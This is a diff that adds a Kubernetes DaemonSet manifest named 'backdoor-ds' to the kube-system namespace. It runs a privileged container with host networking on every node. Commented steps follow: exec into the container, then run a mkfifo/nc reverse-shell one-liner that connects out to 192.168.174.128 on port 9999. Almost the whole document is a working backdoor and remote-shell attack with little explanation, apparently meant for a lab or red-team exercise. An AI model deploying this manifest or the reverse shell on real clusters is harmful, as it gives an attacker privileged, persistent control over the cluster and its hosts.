@@ -1,0 +1,33 @@
+apiVersion: apps/v1
+kind: DaemonSet
+metadata:
+  name: backdoor-ds
+  namespace: kube-system
+spec:
+  selector:
+    matchLabels:
+      name: backdoor
+  template:
+    metadata:
+      labels:
+        name: backdoor
+    spec:
+      containers:
+      - name: reverse-shell
+        image: nicolaka/netshoot
+        command:
+          - /bin/bash
+          - -c
+          - |
+            sleep infinity;
+        securityContext:
+          privileged: true
+      hostNetwork: true
+      tolerations:
+      - operator: Exists
+
+
+#Run the below commands
+  #kubectl get pods -n kube-system -l name=backdoor
+  #kubectl exec -it backdoor-ds-<pod-name> -n kube-system -c reverse-shell -- /bin/bash
+  #rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 192.168.174.128 9999 > /tmp/f
